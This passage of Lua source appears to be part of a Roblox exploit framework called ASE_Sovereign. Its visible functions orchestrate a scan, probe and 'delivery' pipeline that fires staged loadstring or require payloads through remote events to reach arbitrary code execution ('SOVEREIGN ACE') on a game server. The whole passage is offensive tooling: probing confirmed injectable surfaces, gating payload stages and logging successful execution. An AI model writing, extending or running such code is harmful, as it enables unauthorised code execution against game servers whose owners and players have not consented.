    local rsmRec = record.candidate.rsmRec

    slog("INFO", string.format("DELIVER[LOADSTRING]: %s — %d stages", name, #LOADSTRING_STAGES))

    record.stages = {}
    local highestStage = 0

    for i, stage in ipairs(LOADSTRING_STAGES) do
        slog("INFO", string.format(
            "Stage %d/%d: %s", i, #LOADSTRING_STAGES, stage.label))

        local stageArgs = buildStringProbe(rsmRec, stage.code)
        local ok, res, lat = fireRemote(inst, stageArgs, SCFG.StageTimeout)
        ASE_Sovereign.Stats.deliveries = ASE_Sovereign.Stats.deliveries + 1

        local confirmed = pcall(function()
            return stage.confirm(ok, res)
        end) and stage.confirm(ok, res)

        local stageRecord = {
            label     = stage.label,
            code      = stage.code,
            ok        = ok,
            res       = res,
            lat       = lat,
            confirmed = confirmed,
            firedAt   = os.clock(),
        }
        table.insert(record.stages, stageRecord)

        slog("INFO", string.format(
            "Stage %s: ok=%s  confirmed=%s  lat=%.0fms  res=%s",
            stage.label, tostring(ok), tostring(confirmed),
            lat*1000, tostring(res):sub(1,60)))

        if confirmed then
            highestStage = i
        else
            -- Gate: if this stage failed, don't proceed
            slog("WARN", string.format(
                "Stage %s failed — halting delivery chain", stage.label))
            break
        end

        task.wait(SCFG.DeliveryInterval)
    end

    local achieved = highestStage >= 2  -- SERVICE_ACCESS = functional ACE

    if achieved then
        slog("INFO", string.format(
            "SOVEREIGN ACE ACHIEVED: %s  highest_stage=%s",
            name, LOADSTRING_STAGES[highestStage] and
                  LOADSTRING_STAGES[highestStage].label or "?"))

        -- Annotate CSK
        local CSK = getCSK()
        if CSK then
            CSK.Annotate(name, string.format(
                "SOVEREIGN ACE: loadstring delivery stage %d/%d (%s)",
                highestStage, #LOADSTRING_STAGES,
                LOADSTRING_STAGES[highestStage] and
                LOADSTRING_STAGES[highestStage].label or "?"))
        end
    else
        slog("WARN", string.format(
            "Delivery reached stage %d/%d — partial execution",
            highestStage, #LOADSTRING_STAGES))
    end

    record.deliveryResult = {
        track        = "LOADSTRING",
        highestStage = highestStage,
        achieved     = achieved,
        firedAt      = os.clock(),
    }

    return achieved, highestStage
end

function ASE_Sovereign.Deliver(record)
    if not record then
        slog("ERROR", "Deliver: no record provided")
        return false, "No record"
    end

    setPhase(ASE_Sovereign.PHASE.EXECUTE)

    slog("INFO", string.format(
        "Phase 3: Sovereign Delivery — %s  track=%s  conf=%.0f%%",
        record.name, record.track, record.confidence * 100))

    if record.track == ASE_Sovereign.TRACK.REQUIRE then
        return deliverRequire(record)
    elseif record.track == ASE_Sovereign.TRACK.LOADSTRING then
        return deliverLoadstring(record)
    else
        slog("ERROR", "Unknown track: " .. tostring(record.track))
        return false, "Unknown track"
    end
end

-- ══════════════════════════════════════════════════════════════════════════════
-- FULL RUN — all three phases sequentially
-- ══════════════════════════════════════════════════════════════════════════════

function ASE_Sovereign.Run()
    slog("INFO", "=== SOVEREIGN ACE RUN INITIATED ===")

    -- Reset stats
    ASE_Sovereign.Pairs      = {}
    ASE_Sovereign.Candidates = {}
    ASE_Sovereign.ProbeLog   = {}
    ASE_Sovereign.Stats = {
        candidatesScanned = 0,
        probesFired       = 0,
        tiersHit          = 0,
        confirmed         = 0,
        deliveries        = 0,
    }

    -- Phase 1
    local scanOk, scanErr = ASE_Sovereign.RunScan()
    if not scanOk then
        slog("ERROR", "Phase 1 failed: " .. tostring(scanErr))
        return false, scanErr
    end
    if #ASE_Sovereign.Candidates == 0 then
        slog("WARN", "No sovereign candidates found — surface may be clean or RSM data insufficient")
        return false, "No candidates"
    end

    task.wait(0.5)

    -- Phase 2
    local probeOk, nConfirmed = ASE_Sovereign.RunProbes()
    if not probeOk or nConfirmed == 0 then
        slog("WARN", "Phase 2: no confirmations — surface does not appear sovereign-injectable")
        return false, "No confirmations"
    end

    slog("INFO", string.format(
        "=== %d SOVEREIGN SURFACE(S) CONFIRMED ===", nConfirmed))

    -- Phase 3: deliver to highest-confidence confirmed surface
    local bestRecord, bestConf = nil, 0
    for _, rec in pairs(ASE_Sovereign.Pairs) do
        if rec.confidence > bestConf then
            bestRecord = rec
            bestConf   = rec.confidence
        end
    end

    if bestRecord and bestConf >= SCFG.ConfirmThreshold then
        task.wait(0.5)
        local delivOk, delivResult = ASE_Sovereign.Deliver(bestRecord)
        slog("INFO", string.format(
            "Delivery result: ok=%s  result=%s",
            tostring(delivOk), tostring(delivResult)))
        return delivOk, delivResult
    end

    return true, nConfirmed
end

-- ══════════════════════════════════════════════════════════════════════════════
-- ASE INTEGRATION — GOAL_SOVEREIGN entry point
-- ══════════════════════════════════════════════════════════════════════════════
-- Called by ASE_GoalEngine.Run() when goalType == "SOVEREIGN"
-- Params: { phase, candidateName }
--   phase == nil → full run
--   phase == "SCAN" → phase 1 only
--   phase == "PROBE" → phase 2 only (candidates must already exist)
--   phase == "EXECUTE" → phase 3 only (record must exist in Pairs)

function ASE_Sovereign.GoalRun(goal)
    local params = goal.params or {}
    local phase  = params.phase

    if phase == ASE_Sovereign.PHASE.SCAN then
        return ASE_Sovereign.RunScan()
    elseif phase == ASE_Sovereign.PHASE.PROBE then
        return ASE_Sovereign.RunProbes()
    elseif phase == ASE_Sovereign.PHASE.EXECUTE then
        local name = params.candidateName
        local record = name and ASE_Sovereign.Pairs[name]
        if not record then
            -- Deliver to best confirmed surface
            local best, bestConf = nil, 0
            for _, rec in pairs(ASE_Sovereign.Pairs) do
                if rec.confidence > bestConf then
                    best = rec; bestConf = rec.confidence
                end
            end
            record = best
        end
        if not record then
            error("No confirmed sovereign surface to deliver to")
        end
        return ASE_Sovereign.Deliver(record)
    else
        -- Full run
        return ASE_Sovereign.Run()
    end
end

-- ── Public query API ───────────────────────────────────────────────────────────

function ASE_Sovereign.GetPairs()
    return ASE_Sovereign.Pairs
end

function ASE_Sovereign.GetCandidates()
    return ASE_Sovereign.Candidates
end

function ASE_Sovereign.GetStats()
    return {
        phase             = ASE_Sovereign.CurrentPhase,
        candidatesScanned = ASE_Sovereign.Stats.candidatesScanned,
        candidatesFound   = #ASE_Sovereign.Candidates,
        probesFired       = ASE_Sovereign.Stats.probesFired,
        tiersHit          = ASE_Sovereign.Stats.tiersHit,
        confirmed         = ASE_Sovereign.Stats.confirmed,
        deliveries        = ASE_Sovereign.Stats.deliveries,
    }
end

function ASE_Sovereign.GetProbeLog(n)
    n = n or 20
    local out = {}
    for i = #ASE_Sovereign.ProbeLog, math.max(1, #ASE_Sovereign.ProbeLog - n + 1), -1 do
        table.insert(out, ASE_Sovereign.ProbeLog[i])
    end
    return out
end

-- ── Export ─────────────────────────────────────────────────────────────────────
_G.PC             = _G.PC or {}
_G.PC.Sovereign   = ASE_Sovereign
